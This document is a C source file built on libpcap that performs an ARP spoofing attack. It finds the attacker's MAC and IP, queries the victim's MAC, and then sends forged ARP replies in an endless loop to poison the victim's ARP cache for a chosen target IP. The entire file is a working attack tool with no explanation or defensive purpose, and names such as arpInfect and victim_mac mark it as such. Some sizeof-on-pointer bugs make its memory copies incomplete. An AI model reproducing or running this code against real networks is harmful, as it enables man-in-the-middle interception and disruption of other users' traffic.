#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <errno.h>


#define ether_ARP 0x0806 

void GetMyAddress(char *if_name, unsigned char* attacker_Mac, struct in_addr* attacker_IP){

    struct ifreq ifr;
    int fd=socket(PF_INET, SOCK_STREAM, 0);
    strcpy(ifr.ifr_name, if_name);

 
    if(ioctl(fd, SIOCGIFHWADDR,& ifr)<0){
        perror("ioctl ");
        return ;
    }
    memcpy(attacker_Mac, ifr.ifr_addr.sa_data, 6);


    if (ioctl(fd,SIOCGIFADDR,&ifr)==-1) {
        perror(0);
        close(fd);
        exit(1);
    }
    
    memcpy(attacker_IP, (const void*)&(((sockaddr_in *)&ifr.ifr_addr)->sin_addr), sizeof(attacker_IP));


}

void arpSend(pcap_t* handle, unsigned char* src_mac, unsigned char* dst_mac, struct in_addr* src_IP, struct in_addr* dst_IP, u_short op){

    struct ether_header eth_header;
    memcpy(eth_header.ether_shost, src_mac, sizeof(eth_header.ether_shost));
    memcpy(eth_header.ether_dhost, dst_mac, sizeof(eth_header.ether_dhost));
    eth_header.ether_type = ntohs(ether_ARP);

    struct ether_arp req_header;
    req_header.arp_hrd = htons(0x0001);
    req_header.arp_pro = htons(0x0800);
    req_header.arp_hln = 0x6;
    req_header.arp_pln = 0x4;
    req_header.arp_op = htons(op);
    memcpy(&req_header.arp_sha, src_mac, sizeof(req_header.arp_sha));
    memcpy(&req_header.arp_spa, src_IP, sizeof(req_header.arp_spa));
    memcpy(&req_header.arp_tpa, dst_IP, sizeof(req_header.arp_tpa));

    if (!memcmp(dst_mac, "\xff\xff\xff\xff\xff\xff", 6)){
    	memset(req_header.arp_tha, 0x00, sizeof(req_header.arp_tha));
    }
    else{
    	memcpy(&req_header.arp_tha, dst_mac, sizeof(req_header.arp_tha));
    }


    unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    memcpy(frame,&eth_header,sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header),&req_header,sizeof(struct ether_arp));

    
    if(pcap_sendpacket(handle, frame, sizeof(frame))==-1){
        pcap_perror(handle,0);
        pcap_close(handle);
        exit(1);
    }
}



void GetSenderMac(char* if_name, unsigned char* attacker_Mac, unsigned char* sender_mac, struct in_addr* attacker_IP, struct in_addr* sender_IP){

	unsigned char broadcast[7] = "\xff\xff\xff\xff\xff\xff";
	char pcap_errbuf[PCAP_ERRBUF_SIZE];
    pcap_errbuf[0]='\0';
    pcap_t* handle=pcap_open_live(if_name,BUFSIZ,1,1000,pcap_errbuf);
    if (pcap_errbuf[0]!='\0') {
        fprintf(stderr,"%s\n",pcap_errbuf);
    }
    if (!handle) {
        exit(1);
    }

    while(1){


    	arpSend(handle, attacker_Mac, broadcast, attacker_IP, sender_IP, 1);
    	struct pcap_pkthdr* header;         // The header that pcap gives us
	    const u_char* packet;               // The actual packet
    	int res = pcap_next_ex(handle, &header, &packet);
    	if (res == 0) continue;
    	if (res == -1 || res == -2) break;

    	struct ether_header* rec_eth;
    	rec_eth = (struct ether_header*)(packet);
    	
    	if (rec_eth->ether_type == htons(ether_ARP)){

		    struct ether_arp* rec_arp;
		    rec_arp = (struct ether_arp*)(packet+sizeof(ether_header));
		    if (memcmp(rec_arp->arp_spa, sender_IP, sizeof(rec_arp->arp_spa))==0){
			    printf("%d.%d.%d.%d\n",rec_arp->arp_spa[0],rec_arp->arp_spa[1],rec_arp->arp_spa[2],rec_arp->arp_spa[3]);
				printf("receiving packet is Done!\n");
				memcpy(sender_mac, rec_arp->arp_sha, sizeof(sender_mac));
				//memcpy(victimMac, rec_arp->arp_sha, sizeof(victimMac));

		    	break;
		    }
    	}
	
	}

}


void arpInfect(char* if_name,  unsigned char* attacker_mac, unsigned char* sender_mac, struct in_addr* sender_IP, struct in_addr* receiver_IP){

	char pcap_errbuf[PCAP_ERRBUF_SIZE];
    pcap_errbuf[0]='\0';
    pcap_t* handle=pcap_open_live(if_name,BUFSIZ,1,1000,pcap_errbuf);
    if (pcap_errbuf[0]!='\0') {
        fprintf(stderr,"%s\n",pcap_errbuf);
    }
    if (!handle) {
        exit(1);
    }

    while(1){	
    	arpSend(handle, attacker_mac, sender_mac, receiver_IP, sender_IP, 2);
    	printf("Sending Packet...\n");
		sleep(1);
    
	}

    	pcap_close(handle);
}



int main(int argc, char* argv[]){ 
	
	char* if_name;
    unsigned char attacker_mac[6];
    unsigned char victim_mac[6];
	struct in_addr attacker_IP;
    struct in_addr victim_ip_addr;
    struct in_addr target_ip_addr;

    if_name = argv[1];
    inet_aton(argv[2], &victim_ip_addr);
    inet_aton(argv[3], &target_ip_addr);

	GetMyAddress(if_name, attacker_mac, &attacker_IP);
	GetSenderMac(if_name, attacker_mac, victim_mac, &attacker_IP, &victim_ip_addr);
	arpInfect(if_name,  attacker_mac, victim_mac, &victim_ip_addr,  &target_ip_addr);

	return 0;
}




